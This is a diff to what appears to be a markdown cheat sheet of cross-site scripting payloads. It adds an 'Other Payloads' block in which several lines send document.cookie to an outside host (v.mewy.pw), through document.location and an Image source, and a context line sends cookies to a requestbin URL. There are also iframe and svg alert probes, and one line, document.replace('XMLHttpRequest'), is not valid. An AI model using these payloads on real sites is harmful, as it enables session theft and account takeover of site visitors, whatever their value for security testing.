@@ -346,9 +346,18 @@ window.location.assign()
 document.write('<img src="http://requestbin.fullcontact.com/1bpkogg1?cook='+document.cookie+'">')
 ```
 
-iframe
-```
+**Other Payloads**
+```javascript
 <iframe src="javascript:alert(0)"> 
+fetch("http://v.mewy.pw")
+document.replace("XMLHttpRequest")
+document.location="http://v.mewy.pw?"+document.cookie
+<script>new Image().src="//v.mewy.pw?"+document.cookie</script>
+<svg/onload="alert(1)"/>
+
+// interchangeable
+document['location']=
+document.location=
 ```
 
 **CSP Bypass**  
